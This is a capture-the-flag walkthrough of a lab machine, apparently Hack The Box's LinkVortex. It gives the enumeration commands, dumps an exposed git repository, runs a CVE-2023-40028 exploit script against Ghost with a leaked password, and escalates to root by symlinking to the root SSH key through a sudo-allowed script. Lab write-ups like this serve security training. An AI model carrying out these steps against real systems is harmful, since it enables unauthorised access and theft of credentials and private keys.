- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.47 -oG scan
	nmap -p22,80 -sCV -Pn 10.10.11.47 -oN ports
	```

- I go to the site and see that a de-tialized version of Ghost is running. I find that it has a vulnerability, [CVE-2023-40028](https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg). I need to find a valid credential to be able to abuse this vulnerability.

- I do a search for subdomains and I find one.

	```python
	wfuzz -c -t 100  --hh=230 -w  /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "Host: FUZZ.linkvortex.htb" http://linkvortex.htb
	```

- When listing the found subdomain I find a git repository. I download it with [git-dumper](https://github.com/arthaud/git-dumper)

	```python
	git-dumper "http://dev.linkvortex.htb/.git"  /home/rufo/linkVortex/content/example 
	```

- I search in the repository files and find some passwords. I try with the passwords I found and the vulnerability I found before and I manage to find some valid credentials.
	
	```python
	./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
	```

- I modify the script to point to the endpoint and I manage to read internal files of the machine. LFI

- I list the repository files and manage to find some credentials in the production environment configuration file

- Thanks to these credentials I am able to log in via ssh and read the first flag

- Listing the system files, I see that I can execute as root the file clean_symlink.sh and passing any file as argument.
- I create a couple of symbolic links to be able to read the file with the ssh key of the root user.

	```python
	ln -s /root/.ssh/id_rsa link1.txt
	ln -s /tmp/a/link1.txt duo.png
	sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/a/duo.png
	```

- With this key I connect via ssh as root and manage to read the second flag
